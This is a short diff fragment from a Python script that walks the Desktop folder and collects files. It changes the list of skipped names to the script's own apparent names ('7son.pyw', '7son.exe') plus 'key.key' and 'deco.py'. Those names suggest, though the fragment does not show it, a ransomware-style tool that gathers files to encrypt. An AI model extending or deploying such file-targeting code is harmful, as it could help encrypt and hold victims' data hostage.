@@ -16,7 +16,7 @@ files = []
 # Search Desktop
 for root, dirs, fils in os.walk(DESK):
     for file in fils:
-        if file in ['rohub.py', 'key.key', 'deco.py', 'desktop.ini']:
+        if file in ['7son.pyw', 'key.key', 'deco.py', 'desktop.ini', '7son.pyw', '7son.exe']:
             continue
         filepath = os.path.join(root, file)
         if os.path.isfile(filepath):
